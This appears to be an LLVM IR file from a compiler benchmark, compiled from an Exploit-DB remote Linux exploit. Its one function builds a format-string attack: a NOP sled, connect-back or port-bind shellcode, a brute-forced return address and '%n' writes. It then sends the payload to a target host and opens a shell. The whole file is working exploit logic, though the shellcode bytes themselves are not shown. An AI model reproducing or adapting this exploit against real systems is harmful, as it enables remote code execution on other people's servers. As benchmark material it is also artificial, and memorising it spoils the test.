; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i8, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@BUFFERSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [17 x i8] c" gethostbyname()\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@bretaddr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [38 x i8] c" [*] searching ret address...\09: %010p\00", align 1
@stdout = common dso_local global i32 0, align 4
@cback = common dso_local global i64 0, align 8
@conn_back = common dso_local global i8* null, align 8
@port_bind = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@shaddr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [23 x i8] c"%%%du%%%u$n%%%du%%%u$n\00", align 1
@pos = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@ERROR = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [8 x i8] c" socket\00", align 1
@TIMEOUT = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [10 x i8] c" closed\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c" read()\00", align 1
@.str.8 = private unnamed_addr constant [9 x i8] c" write()\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"\0D\0D\00", align 1
@PORTBIND = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [19 x i8] c"\0A\0A [!] finished!\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [17 x i8] c"\0A\0A [!] failed!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @exploit(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %struct.hostent*, align 8
  %20 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %21 = load i32, i32* @BUFFERSIZE, align 4
  %22 = zext i32 %21 to i64
  %23 = call i8* @llvm.stacksave()
  store i8* %23, i8** %5, align 8
  %24 = alloca i8, i64 %22, align 16
  store i64 %22, i64* %6, align 8
  %25 = load i32, i32* @BUFFERSIZE, align 4
  %26 = zext i32 %25 to i64
  %27 = alloca i8, i64 %26, align 16
  store i64 %26, i64* %7, align 8
  %28 = load i32, i32* @BUFFERSIZE, align 4
  %29 = zext i32 %28 to i64
  %30 = alloca i8, i64 %29, align 16
  store i64 %29, i64* %8, align 8
  %31 = load i8*, i8** %3, align 8
  %32 = call %struct.hostent* @gethostbyname(i8* %31)
  store %struct.hostent* %32, %struct.hostent** %19, align 8
  %33 = icmp eq %struct.hostent* %32, null
  br i1 %33, label %34, label %38

34:                                               ; preds = %2
  %35 = call i32 @herror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %37 = call i32 @exit(i32 1) #5
  unreachable

38:                                               ; preds = %2
  %39 = load i32, i32* @bretaddr, align 4
  store i32 %39, i32* %14, align 4
  br label %40

40:                                               ; preds = %168, %38
  %41 = load i32, i32* %14, align 4
  %42 = load i32, i32* @bretaddr, align 4
  %43 = sub nsw i32 %42, 500
  %44 = icmp sge i32 %41, %43
  br i1 %44, label %45, label %171

45:                                               ; preds = %40
  %46 = load i32, i32* %14, align 4
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0), i32 %46)
  %48 = load i32, i32* @stdout, align 4
  %49 = call i32 @fflush(i32 %48)
  %50 = trunc i64 %22 to i32
  %51 = call i32 @bzero(i8* %24, i32 %50)
  %52 = call i32 @memset(i8* %24, i32 144, i32 496)
  %53 = load i64, i64* @cback, align 8
  %54 = icmp ne i64 %53, 0
  br i1 %54, label %55, label %61

55:                                               ; preds = %45
  %56 = getelementptr inbounds i8, i8* %24, i64 350
  %57 = load i8*, i8** @conn_back, align 8
  %58 = load i8*, i8** @conn_back, align 8
  %59 = call i32 @strlen(i8* %58)
  %60 = call i32 @memcpy(i8* %56, i8* %57, i32 %59)
  br label %67

61:                                               ; preds = %45
  %62 = getelementptr inbounds i8, i8* %24, i64 350
  %63 = load i8*, i8** @port_bind, align 8
  %64 = load i8*, i8** @port_bind, align 8
  %65 = call i32 @strlen(i8* %64)
  %66 = call i32 @memcpy(i8* %62, i8* %63, i32 %65)
  br label %67

67:                                               ; preds = %61, %55
  %68 = trunc i64 %26 to i32
  %69 = call i32 @bzero(i8* %27, i32 %68)
  %70 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* %14)
  %71 = call i32 @strncat(i8* %24, i8* %27, i32 4)
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %14, align 4
  %74 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* %14)
  %75 = call i32 @strncat(i8* %24, i8* %27, i32 4)
  %76 = load i32, i32* %14, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %14, align 4
  %78 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* %14)
  %79 = call i32 @strncat(i8* %24, i8* %27, i32 4)
  %80 = load i32, i32* @shaddr, align 4
  %81 = and i32 %80, -65536
  %82 = lshr i32 %81, 16
  store i32 %82, i32* %15, align 4
  %83 = load i32, i32* @shaddr, align 4
  %84 = and i32 %83, 65535
  store i32 %84, i32* %16, align 4
  %85 = load i32, i32* %16, align 4
  %86 = sub i32 %85, 496
  %87 = sub i32 %86, 12
  store i32 %87, i32* %9, align 4
  %88 = load i32, i32* %9, align 4
  %89 = call i32 @check(i32 %88)
  store i32 %89, i32* %9, align 4
  %90 = load i32, i32* %15, align 4
  %91 = load i32, i32* %16, align 4
  %92 = sub i32 %90, %91
  store i32 %92, i32* %10, align 4
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @check(i32 %93)
  store i32 %94, i32* %10, align 4
  %95 = load i32, i32* %9, align 4
  %96 = load i32, i32* @pos, align 4
  %97 = load i32, i32* %10, align 4
  %98 = load i32, i32* @pos, align 4
  %99 = add nsw i32 %98, 2
  %100 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0), i32 %95, i32 %96, i32 %97, i32 %99)
  %101 = call i32 @strcat(i8* %24, i8* %27)
  %102 = call i32 @strcat(i8* %24, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %103 = load i32, i32* @AF_INET, align 4
  %104 = load i32, i32* @SOCK_STREAM, align 4
  %105 = call i32 @socket(i32 %103, i32 %104, i32 0)
  store i32 %105, i32* %13, align 4
  %106 = load i32, i32* @ERROR, align 4
  %107 = icmp eq i32 %105, %106
  br i1 %107, label %108, label %112

108:                                              ; preds = %67
  %109 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %111 = call i32 @exit(i32 1) #5
  unreachable

112:                                              ; preds = %67
  %113 = load i32, i32* @AF_INET, align 4
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %20, i32 0, i32 3
  store i32 %113, i32* %114, align 4
  %115 = load i32, i32* %4, align 4
  %116 = call i32 @htons(i32 %115)
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %20, i32 0, i32 2
  store i32 %116, i32* %117, align 4
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %20, i32 0, i32 1
  %119 = load %struct.hostent*, %struct.hostent** %19, align 8
  %120 = getelementptr inbounds %struct.hostent, %struct.hostent* %119, i32 0, i32 0
  %121 = load i64, i64* %120, align 8
  %122 = inttoptr i64 %121 to %struct.in_addr*
  %123 = bitcast %struct.in_addr* %118 to i8*
  %124 = bitcast %struct.in_addr* %122 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %123, i8* align 4 %124, i64 4, i1 false)
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %20, i32 0, i32 0
  %126 = call i32 @bzero(i8* %125, i32 8)
  %127 = load i32, i32* %13, align 4
  %128 = bitcast %struct.sockaddr_in* %20 to %struct.sockaddr*
  %129 = load i32, i32* @TIMEOUT, align 4
  %130 = call i32 @connect_timeout(i32 %127, %struct.sockaddr* %128, i32 4, i32 %129)
  %131 = load i32, i32* @ERROR, align 4
  %132 = icmp eq i32 %130, %131
  br i1 %132, label %133, label %136

133:                                              ; preds = %112
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %135 = call i32 @exit(i32 1) #5
  unreachable

136:                                              ; preds = %112
  %137 = load i32, i32* %13, align 4
  %138 = trunc i64 %29 to i32
  %139 = call i64 @read(i32 %137, i8* %30, i32 %138)
  %140 = icmp sle i64 %139, 0
  br i1 %140, label %141, label %145

141:                                              ; preds = %136
  %142 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %144 = call i32 @exit(i32 1) #5
  unreachable

145:                                              ; preds = %136
  %146 = load i32, i32* %13, align 4
  %147 = call i32 @strlen(i8* %24)
  %148 = call i64 @write(i32 %146, i8* %24, i32 %147)
  %149 = icmp sle i64 %148, 0
  br i1 %149, label %150, label %154

150:                                              ; preds = %145
  %151 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0))
  %152 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %153 = call i32 @exit(i32 1) #5
  unreachable

154:                                              ; preds = %145
  %155 = load i32, i32* %13, align 4
  %156 = call i32 @close(i32 %155)
  %157 = load i64, i64* @cback, align 8
  %158 = icmp ne i64 %157, 0
  br i1 %158, label %159, label %161

159:                                              ; preds = %154
  %160 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0))
  br label %168

161:                                              ; preds = %154
  %162 = load i8*, i8** %3, align 8
  %163 = load i32, i32* @PORTBIND, align 4
  %164 = call i32 @shell(i8* %162, i32 %163)
  br label %165

165:                                              ; preds = %161
  %166 = load i32, i32* %14, align 4
  %167 = sub nsw i32 %166, 2
  store i32 %167, i32* %14, align 4
  br label %168

168:                                              ; preds = %165, %159
  %169 = load i32, i32* %14, align 4
  %170 = sub nsw i32 %169, 4
  store i32 %170, i32* %14, align 4
  br label %40

171:                                              ; preds = %40
  %172 = load i64, i64* @cback, align 8
  %173 = icmp ne i64 %172, 0
  br i1 %173, label %174, label %176

174:                                              ; preds = %171
  %175 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.10, i64 0, i64 0))
  br label %178

176:                                              ; preds = %171
  %177 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0))
  br label %178

178:                                              ; preds = %176, %174
  %179 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %179)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @herror(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i32 @strncat(i8*, i8*, i32) #2

declare dso_local i32 @check(i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @htons(i32) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #4

declare dso_local i32 @connect_timeout(i32, %struct.sockaddr*, i32, i32) #2

declare dso_local i64 @read(i32, i8*, i32) #2

declare dso_local i64 @write(i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @shell(i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind willreturn }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
